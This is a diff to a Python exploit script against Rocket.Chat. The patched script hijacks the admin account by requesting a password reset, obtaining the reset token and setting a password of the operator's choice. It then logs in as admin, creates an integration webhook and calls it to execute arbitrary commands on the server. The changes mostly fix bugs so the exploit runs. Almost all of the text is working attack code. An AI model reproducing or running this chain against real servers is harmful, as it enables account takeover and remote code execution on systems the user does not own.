@@ -74,7 +74,7 @@ args = parser.parse_args()
 
 adminmail = args.a
 target = args.t
-pass = args.p
+passToSet = args.p
 
 def forgotpassword(email,url):
 	payload='{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"sendForgotPasswordEmail\\",\\"params\\":[\\"'+email+'\\"]}"}'
@@ -104,7 +104,7 @@ def resettoken(url):
 	return token
 
 def changingpassword(url,token):
-	payload = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"resetPassword\\",\\"params\\":[\\"'+token+'\\",\\"P@$$w0rd!1234\\"]}"}'
+	payload = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"resetPassword\\",\\"params\\":[\\"'+token+'\\",\\"'+passToSet+'\\"]}"}'
 	headers={'content-type': 'application/json'}
 	r = requests.post(url+"/api/v1/method.callAnon/resetPassword", data = payload, headers = headers, verify = False, allow_redirects = False)
 	if "error" in r.text:
@@ -113,12 +113,12 @@ def changingpassword(url,token):
 	
 def auth(url):
 	# Authenticating
-	sha256pass = hashlib.sha256(pass).hexdigest()
+	sha256pass = hashlib.sha256(passToSet).hexdigest()
 	headers={'content-type': 'application/json'}
 	payload = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"login\\",\\"params\\":[{\\"user\\":{\\"username\\":\\"admin\\"},\\"password\\":{\\"digest\\":\\"'+sha256pass+'\\",\\"algorithm\\":\\"sha-256\\"}}]}"}'
 	r = requests.post(url + "/api/v1/method.callAnon/login",data=payload,headers=headers,verify=False,allow_redirects=False)
 	if "error" in r.text:
-		return false
+		return False
 	data = json.loads(r.text)
 	data =(data['message'])
 	userid = data[32:49]
@@ -131,12 +131,12 @@ def rce(url,userid,token,cmd):
 	cookies = {'rc_uid': userid,'rc_token': token}
         headers = {'X-User-Id': userid,'X-Auth-Token': token}
         r = requests.post(url+'/api/v1/integrations.create',cookies=cookies,headers=headers,data=payload)
-        data = r.text
-        data = data.split(',')
-        token = data[14]
-        token = token[9:57]
-        _id = data[20]
-        _id = _id[7:24]
+	data = r.text
+	data = data.split(',')
+	token = data[14]
+	token = token[9:57]
+	_id = data[20]
+	_id = _id[7:24]
 
 	# Triggering RCE
 	u = url + '/hooks/' + _id + '/' +token
@@ -146,8 +146,8 @@ def rce(url,userid,token,cmd):
 
 ############################################################
 
-authRes = auth(url)
-if authRes == false:
+authRes = auth(target)
+if authRes == False:
 	## Sending Reset mail
 	print(f"[+] Resetting {adminmail} password")
 	forgotpassword(adminmail,target)
@@ -159,10 +159,10 @@ if authRes == false:
 	changingpassword(target,token)
 	
 	print("[+] authenticating as admin")
-	authRes = auth(url)
-	if authRes == false:
+	authRes = auth(target)
+	if authRes == False:
 		print("[-] failed to auth")
-		return
+		exit
 
 ## Authenticating and triggering rce
 
